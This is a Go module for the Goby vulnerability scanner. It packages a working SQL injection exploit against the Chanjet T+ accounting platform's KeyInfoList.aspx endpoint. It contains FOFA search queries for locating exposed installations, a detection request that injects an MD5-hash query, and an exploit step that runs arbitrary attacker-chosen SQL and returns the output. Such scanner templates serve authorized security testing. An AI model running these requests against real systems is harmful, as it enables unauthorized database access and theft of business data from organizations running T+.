package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Chanjet-TPlus /tplus/UFAQD/KeyInfoList.aspx SQL Injection Vulnerability",
    "Description": "<p>Changjietong T+is a cloud based collaborative office platform that integrates functions such as document, collaboration, communication, and office automation. There is an SQL injection vulnerability at the T+KeyInfoList. aspx interface of Changjie Tong. Malicious attackers may exploit this vulnerability to obtain sensitive server information, ultimately leading to server failure.</p>",
    "Product": "Chanjet-TPlus",
    "Homepage": "https://www.chanjet.com/",
    "DisclosureDate": "2024-03-26",
    "PostTime": "2024-04-16",
    "Author": "lidingke@baimaohui.net",
    "FofaQuery": "body=\"><script>location='/tplus/';</script></body>\" || title==\"畅捷通 T+\"",
    "GobyQuery": "body=\"><script>location='/tplus/';</script></body>\" || title==\"畅捷通 T+\"",
    "Level": "2",
    "Impact": "<p>Malicious attackers may exploit this vulnerability to obtain sensitive server information, ultimately leading to server failure.</p>",
    "Recommendation": "<p>1. Officials have not yet fixed the vulnerability. Please contact the vendor to fix the vulnerability: <a href=\"https://www.chanjet.com/\">https://www.chanjet.com/</a><a href=\"https://www.adobe.com/\"></a></p><p>2. Setting up access policies and white-list access through security devices such as firewalls.</p><p>3. Keep the system off the public web if it is not necessary.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "default,custom",
            "show": ""
        },
        {
            "name": "content",
            "type": "input",
            "value": "SELECT+sys.fn_varbintohexstr(hashbytes(%27MD5%27,%27123456%27))",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "OR",
        {
            "Request": {
                "method": "GET",
                "uri": "/tplus/UFAQD/KeyInfoList.aspx?preload=1&zt=%27)AND+1+IN+(SELECT+sys.fn_varbintohexstr(hashbytes(%27MD5%27,%27123456%27)))--+",
                "follow_redirect": false,
                "header": {
                    "Accept": "*/*",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.63 Safari/537.36",
                    "Connection": "close"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "0xe10adc3949ba59abbe56e057f20f883e",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "keymemo|lastbody|variable|/tplus/UFAQD/KeyInfoList.aspx?preload=1&zt=%27)AND+1+IN+(SELECT+sys.fn_varbintohexstr(hashbytes(%27MD5%27,%27123456%27)))--+",
                "vulurl|lastbody|variable|{{{fixedhostinfo}}}/tplus/UFAQD/KeyInfoList.aspx?preload=1&zt=%27)AND+1+IN+(SELECT+sys.fn_varbintohexstr(hashbytes(%27MD5%27,%27123456%27)))--+"
            ]
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/tplus/UFAQD/KeyInfoList.aspx?preload=1&zt=%27)AND+1+IN+({{{content}}})--+",
                "follow_redirect": false,
                "header": {
                    "Accept": "*/*",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.63 Safari/537.36",
                    "Connection": "close"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|([\\s\\S]*)"
            ]
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.2",
    "Translation": {
        "CN": {
            "Name": "畅捷通T+  /tplus/UFAQD/KeyInfoList.aspx SQL 注入漏洞",
            "Product": "畅捷通-TPlus",
            "Description": "<p>畅捷通 T+ 是一款集文档、协同、通讯、办公自动化等功能于一体的云端协同办公平台。畅捷通T+KeyInfoList.aspx接口处存在SQL注入漏洞 ，恶意攻击者可能会利用该漏洞获取服务器敏感信息，最终可能导致服务器失陷。<br></p>",
            "Recommendation": "<p>1、官⽅暂未修复该漏洞，请⽤户联系⼚商修复漏洞：<a href=\"https://www.chanjet.com/\">https://www.chanjet.com/</a><a href=\"https://www.adobe.com/\" target=\"_blank\"></a></p><p>2、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>3、如⾮必要，禁⽌公⽹访问该系统。</p>",
            "Impact": "<p>畅捷通T+KeyInfoList.aspx接口处存在SQL注入漏洞 ，恶意攻击者可能会利用该漏洞获取服务器敏感信息，最终可能导致服务器失陷。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "Chanjet-TPlus /tplus/UFAQD/KeyInfoList.aspx SQL Injection Vulnerability",
            "Product": "Chanjet-TPlus",
            "Description": "<p>Changjietong T+is a cloud based collaborative office platform that integrates functions such as document, collaboration, communication, and office automation. There is an SQL injection vulnerability at the T+KeyInfoList. aspx interface of Changjie Tong. Malicious attackers may exploit this vulnerability to obtain sensitive server information, ultimately leading to server failure.<br></p>",
            "Recommendation": "<p>1. Officials have not yet fixed the vulnerability. Please contact the vendor to fix the vulnerability:&nbsp;<a href=\"https://www.chanjet.com/\">https://www.chanjet.com/</a><a href=\"https://www.adobe.com/\" target=\"_blank\"></a></p><p>2. Setting up access policies and white-list access through security devices such as firewalls.</p><p>3. Keep the system off the public web if it is not necessary.</p>",
            "Impact": "<p>Malicious attackers may exploit this vulnerability to obtain sensitive server information, ultimately leading to server failure.<br><br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocGlobalParams": {},
    "ExpGlobalParams": {},
    "PocId": "10942"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
